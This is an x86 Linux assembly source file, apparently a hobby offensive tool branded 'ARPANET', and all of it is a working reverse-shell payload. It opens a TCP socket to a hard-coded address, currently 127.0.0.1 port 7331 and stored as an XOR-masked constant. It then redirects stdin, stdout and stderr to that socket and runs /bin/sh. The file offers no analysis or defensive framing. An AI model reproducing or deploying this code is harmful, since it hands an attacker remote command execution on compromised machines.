;       _/_/    _/_/_/    _/_/_/      _/_/    _/      _/  _/_/_/_/  _/_/_/_/_/   
;    _/    _/  _/    _/  _/    _/  _/    _/  _/_/    _/  _/            _/        
;   _/_/_/_/  _/_/_/    _/_/_/    _/_/_/_/  _/  _/  _/  _/_/_/        _/         
;  _/    _/  _/    _/  _/        _/    _/  _/    _/_/  _/            _/          
; _/    _/  _/    _/  _/        _/    _/  _/      _/  _/_/_/_/      _/ 
; (c) ARPANET 2020

section .data
    ; output messages
    ; 0x0A = \n
    txt_error_opensocket db "Could not open socket. Aborting...", 0x0A, 0
    txt_error_opensocket_size equ $ - txt_error_opensocket ; subtract addresses to get length
    txt_error_opensocket_connect db "Could not connect to remote server. Aborting...", 0x0A, 0
    txt_error_opensocket_connect_size equ $ - txt_error_opensocket_connect
    txt_error_setupsh db "Could not setup local shell...", 0x0A, 0
    txt_error_setupsh_size equ $ - txt_error_setupsh
    txt_error_setupfd db "Could not rewrite file descriptors...", 0x0A, 0
    txt_error_setupfd_size equ $ - txt_error_setupfd

    ; binary to run
    txt_shpath db "/bin/sh", 0

section .bss
    sockfd resd 1 ; DOUBLEWORD for socket file descriptor

section .text
    global _start

_start:
    ; socket initialization
    call _opensocket

    ; run shell
    call _setupsh

    ; end of program
    call _closesocket
    call _exit

_opensocket:
    push ebp
    mov  ebp, esp

    ; step 1 : get socket
    ; syscall number (sys_socket)
    mov eax, 359
    ; parameters
    mov ebx, 2 ; AF_INET, use IPv4
    mov ecx, 1 ; SOCK_STREAM, use TCP
    mov edx, 0 ; IPPROTO_IP, use IP
    ; start interrupt
    int 80h

    ; step 2 : check if socket was succesfully created
    cmp eax, 0
    jle _error_opensocket

    ; step 3 : fetch socket file descriptor
    mov [sockfd], eax

    ; step 4 : push required info on stack
    mov edi, 0xfeffff80
    xor edi, 0xffffffff ; needed to get 127.0.0.1 in network byte order
    push edi
    push word 0xA31C ; port, 7331 in network byte order
    push word 2 ; AF_INET

    ; step 5 : connect socket
    ; syscall number (sys_connect)
    mov eax, 362
    ; parameters
    mov ebx, [sockfd] ; socket file descriptor
    mov ecx, esp
    mov edx, 0x10
    int 80h

    mov esp, ebp
    pop ebp

    ; step 5 : check if connection was successful
    cmp eax, 0
    jl _error_opensocket_connect

    ret

_setupsh:
    ; step 1 : duplicate socket file descriptor to all std file descriptors
    mov edx, 2
    call _setupfd

    ; step 2 : boot up /bin/sh
    ; syscall number (sys_execve)
    mov eax, 11
    ; parameters
    mov ebx, txt_shpath ; binary to run
    mov ecx, 0 ; argv, NULL
    mov edx, 0 ; envp, NULL
    int 80h

    ; step 3 : check if shell is running
    cmp eax, 0
    jl _error_setupsh

    ret

_setupfd:
        ; syscall number (sys_dup2)
        mov eax, 63
        ; parameters
        mov ebx, [sockfd] ; file descriptor to duplicate
        mov ecx, edx ; file descriptor to write
        int 80h

        ; check if syscall was successful
        cmp eax, 0
        jl _error_setupfd
   
        ; loop mechanism 
        dec edx
        jns _setupfd
    ret

_closesocket:
    ; syscall number (sys_close)
    mov eax, 6
    ; parameters
    mov ebx, [sockfd] ; file descriptor to close
    int 80h

    ret

_error_opensocket:
    mov ecx, txt_error_opensocket
    mov edx, txt_error_opensocket_size
    call _error

    ret

_error_opensocket_connect:
    mov ecx, txt_error_opensocket_connect
    mov edx, txt_error_opensocket_connect_size
    call _error

    ret

_error_setupsh:
    mov ecx, txt_error_setupsh
    mov edx, txt_error_setupsh_size
    call _error

    ret

_error_setupfd:
    mov ecx, txt_error_setupfd
    mov edx, txt_error_setupfd_size
    call _error

    ret

_error:
    ; syscall number (sys_write)
    mov eax, 4
    ; parameters
    mov ebx, 2 ; output to stderr
    int 80h

_exit:
    ; syscall number (sys_exit)
    mov eax, 1
    ; parameters
    mov ebx, 0 ; return code
    int 80h
